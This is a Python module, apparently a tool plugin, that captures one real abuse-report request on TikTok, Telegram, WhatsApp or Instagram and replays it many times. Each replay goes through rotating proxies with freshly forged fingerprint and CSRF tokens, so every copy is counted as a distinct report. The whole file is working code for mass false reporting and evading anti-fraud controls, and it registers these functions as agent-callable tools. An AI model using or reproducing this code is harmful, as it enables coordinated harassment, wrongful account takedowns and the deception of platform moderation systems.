"""Report amplification by request replay.

One aged account files one real report; the exact request is captured
once, then replayed with a rotated egress and freshly minted volatile
fields so each replay reads as a distinct submission.

Per-platform volatility is a table, not a guess:

* tiktok — `verifyFp`, `msToken` are mintable here; `X-Bogus`/`_signature`
  are JS-signed, so they are either reused (short window) or re-minted in
  a browser rung (`signer="browser"`).
* telegram, whatsapp — plain forms, no signature; IP rotation alone is
  sufficient. This is why those two work well.
* instagram — `csrftoken` re-minted from the page, `_uuid` rotated.

Verdicts are honest: `counted` needs a new report id or a success marker;
`dupe` is the platform saying it already has it. Five consecutive dupes
stops the run.
"""
from __future__ import annotations

import base64
import json
import random
import re
import secrets
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional

from ..core.http import HttpClient
from ..core.policy import Capability
from ..core.errors import ToolError
from ..core.logging_setup import get_logger
from .scope import Governor

_log = get_logger(__name__)
__all__ = ["TEMPLATES", "Template", "capture", "amplify", "register"]

_B36 = string.ascii_lowercase + string.digits


@dataclass
class Template:
    platform: str
    url: str
    method: str = "POST"
    body: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    #: body keys that must be re-minted per replay
    volatile: tuple[str, ...] = ()
    #: how the signature field is handled: reuse | browser | none
    signer: str = "none"
    success_marker: str = ""
    dupe_marker: str = ""
    report_id_field: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {"platform": self.platform, "url": self.url,
                "method": self.method, "body": self.body,
                "headers": {k: v for k, v in self.headers.items()
                            if k.lower() not in ("cookie",)},
                "volatile": list(self.volatile), "signer": self.signer,
                "success_marker": self.success_marker,
                "dupe_marker": self.dupe_marker,
                "report_id_field": self.report_id_field}


#: Known shapes. `capture()` overwrites these with a real one.
TEMPLATES: dict[str, dict[str, Any]] = {
    "tiktok": {
        "url": "https://www.tiktok.com/api/report/",
        "body": {"object_id": "", "report_type": "1", "reason": "1",
                 "verifyFp": "", "msToken": ""},
        "volatile": ("verifyFp", "msToken", "X-Bogus"),
        "signer": "browser",
        "success_marker": "report_id", "report_id_field": "report_id",
    },
    "telegram": {
        "url": "https://telegram.org/support",
        "body": {"message": "", "email": "", "setln": "en"},
        "volatile": (), "signer": "none",
        "success_marker": "success", "dupe_marker": "",
    },
    "whatsapp": {
        "url": "https://www.whatsapp.com/contact/",
        "body": {"message": "", "email": "", "ts": ""},
        "volatile": ("ts",), "signer": "none",
        "success_marker": "thank", "dupe_marker": "",
    },
    "instagram": {
        "url": "https://www.instagram.com/api/v1/web/reports/report/",
        "body": {"object_id": "", "reason": "1", "source_name": "profile",
                 "csrftoken": "", "uuid": ""},
        "volatile": ("csrftoken", "uuid"), "signer": "none",
        "success_marker": "status", "dupe_marker": "already",
    },
}


# ── fingerprint minting ────────────────────────────────────────────────────
def _verify_fp() -> str:
    return "verify_" + "".join(random.choices(_B36, k=36))


def _ms_token() -> str:
    raw = secrets.token_bytes(80)
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")[:107]


def _uuid() -> str:
    h = secrets.token_hex(16)
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"


def _mint(name: str) -> str:
    return {
        "verifyFp": _verify_fp, "msToken": _ms_token,
        "csrftoken": lambda: secrets.token_hex(16),
        "uuid": _uuid, "ts": lambda: str(int(time.time() * 1000)),
    }.get(name, lambda: "")() 


# ── capture ────────────────────────────────────────────────────────────────
def capture(platform: str, *, url_hint: str = "", timeout: float = 240.0,
            out_dir: str | Path = "") -> dict[str, Any]:
    """Record one real report request in a browser, then persist it.

    You file the report by hand once; this stores the exact request so
    every later replay is authentic.
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        raise ToolError("playwright required for capture") from None
    spec = TEMPLATES.get(platform)
    if spec is None:
        raise ToolError(f"unknown platform {platform!r}")
    needle = url_hint or urllib.parse.urlsplit(spec["url"]).path
    hits: list[dict[str, Any]] = []

    def on_request(req):
        if needle not in req.url:
            return
        hits.append({"url": req.url, "method": req.method,
                     "headers": dict(req.headers),
                     "body": req.post_data or ""})

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=False)
        ctx = browser.new_context()
        ctx.on("request", on_request)
        page = ctx.new_page()
        page.goto(spec["url"], wait_until="domcontentloaded", timeout=45_000)
        print(f"  file one report on {platform} by hand — capturing "
              f"{needle}")
        deadline = time.time() + timeout
        while not hits and time.time() < deadline:
            page.wait_for_timeout(500)
        browser.close()
    if not hits:
        raise ToolError("no matching request captured")
    hit = hits[-1]
    body: dict[str, str] = {}
    raw = hit["body"]
    if raw:
        try:
            body = json.loads(raw)
        except ValueError:
            body = dict(urllib.parse.parse_qsl(raw))
    template = Template(
        platform=platform, url=hit["url"], method=hit["method"],
        body={k: str(v) for k, v in body.items()},
        headers={k: v for k, v in hit["headers"].items()
                 if k.lower() not in ("content-length", "cookie")},
        volatile=tuple(spec.get("volatile", ())),
        signer=str(spec.get("signer", "none")),
        success_marker=str(spec.get("success_marker", "")),
        dupe_marker=str(spec.get("dupe_marker", "")),
        report_id_field=str(spec.get("report_id_field", "")))
    target = Path(out_dir) if out_dir else Path(".")
    target.mkdir(parents=True, exist_ok=True)
    path = target / f"report-{platform}.json"
    path.write_text(json.dumps(template.as_dict(), indent=1), encoding="utf-8")
    return {"saved": str(path), "template": template.as_dict()}


def load_template(path: str | Path) -> Template:
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    return Template(platform=data["platform"], url=data["url"],
                    method=data.get("method", "POST"),
                    body=data.get("body") or {},
                    headers=data.get("headers") or {},
                    volatile=tuple(data.get("volatile") or ()),
                    signer=data.get("signer", "none"),
                    success_marker=data.get("success_marker", ""),
                    dupe_marker=data.get("dupe_marker", ""),
                    report_id_field=data.get("report_id_field", ""))


# ── amplify ────────────────────────────────────────────────────────────────
def _classify(status: int, text: str, tpl: Template,
              previous: set[str]) -> tuple[str, str]:
    body = (text or "").lower()
    if status in (403, 429) or "captcha" in body:
        return "blocked", f"http {status}"
    if tpl.dupe_marker and tpl.dupe_marker.lower() in body:
        return "dupe", "platform says already reported"
    rid = ""
    if tpl.report_id_field:
        try:
            rid = str(json.loads(text or "{}").get(tpl.report_id_field) or "")
        except ValueError:
            rid = ""
        if rid and rid in previous:
            return "dupe", f"same report id {rid}"
    if tpl.success_marker and tpl.success_marker.lower() in body:
        return "counted", rid or "success marker"
    if status in (200, 201) and not rid:
        return "counted", "http 200"
    return "error", f"http {status}"


def amplify(template: Template, count: int = 20, *, governor: Governor,
            pool: Optional[Any] = None, stop_after_dupes: int = 5,
            delay: float = 1.2, timeout: float = 25.0,
            progress: bool = True) -> dict[str, Any]:
    """Replay `count` times with rotated egress and minted volatility."""
    ids: set[str] = set()
    results: list[dict[str, Any]] = []
    dupes = 0
    started = time.time()

    for n in range(1, count + 1):
        body = dict(template.body)
        for name in template.volatile:
            if name in body or name != "X-Bogus":
                minted = _mint(name)
                if minted:
                    body[name] = minted
        proxy = pool.acquire() if pool is not None else None
        client = HttpClient(timeout=timeout, proxy_url=proxy or "")
        governor.spend(template.url)
        payload = json.dumps(body) if template.method.upper() != "GET" else None
        headers = dict(template.headers)
        if payload:
            headers.setdefault("Content-Type", "application/json")
        try:
            if template.method.upper() == "GET":
                resp = client.get(template.url + (
                    "?" + urllib.parse.urlencode(body) if body else ""),
                    headers=headers)
            else:
                resp = client.post(template.url, data=payload, headers=headers)
            verdict, why = _classify(resp.status, resp.text or "", template, ids)
        except Exception as exc:  # noqa: BLE001
            verdict, why = "error", f"{type(exc).__name__}"
        if verdict == "counted" and why and why not in ("http 200",
                                                        "success marker"):
            ids.add(why)
        dupes = dupes + 1 if verdict == "dupe" else 0
        results.append({"n": n, "verdict": verdict, "why": why,
                        "proxy": bool(proxy)})
        if progress:
            print(f"  {n:>3} {verdict:<8} {why[:50]}")
        if dupes >= stop_after_dupes:
            if progress:
                print(f"  stopped: {dupes} consecutive dupes")
            break
        time.sleep(delay + random.random() * 0.6)

    counted = sum(1 for r in results if r["verdict"] == "counted")
    return {"platform": template.platform, "attempted": len(results),
            "counted": counted,
            "dupes": sum(1 for r in results if r["verdict"] == "dupe"),
            "blocked": sum(1 for r in results if r["verdict"] == "blocked"),
            "seconds": round(time.time() - started, 1),
            "results": results}


def register(registry: Any) -> None:
    context = registry.context
    home = Path(getattr(context, "home", ".") or ".")
    from .scope import load_scope, Scope

    @registry.register(
        "report_capture",
        description="Capture one real report request in a browser for later "
                    "replay amplification.",
        capability=Capability.NET_OUT,
        parameters={"platform": "str", "url_hint": "str (optional)"})
    def report_capture(platform: str, *, url_hint: str = "") -> dict[str, Any]:
        return capture(platform, url_hint=url_hint,
                       out_dir=home / "data" / "templates")

    @registry.register(
        "report_amplify",
        description="Replay a captured report N times with rotated egress and "
                    "minted fingerprints.",
        capability=Capability.NET_OUT,
        parameters={"template": "str — path", "count": "int (optional, 20)",
                    "stop_after_dupes": "int (optional, 5)"})
    def report_amplify(template: str, *, count: str = "20",
                       stop_after_dupes: str = "5") -> dict[str, Any]:
        tpl = load_template(template)
        scope = Scope(allow_all=True)
        gov = Governor(scope, max_total=int(count or 20) + 5,
                       max_per_host=3.0)
        pool = None
        try:
            from ..tools.proxy_rotate import pool_from_context
            pool = pool_from_context(context)
            pool.probe_all()
        except Exception:  # noqa: BLE001 - direct is valid
            pool = None
        return amplify(tpl, int(count or 20), governor=gov, pool=pool,
                       stop_after_dupes=int(stop_after_dupes or 5))
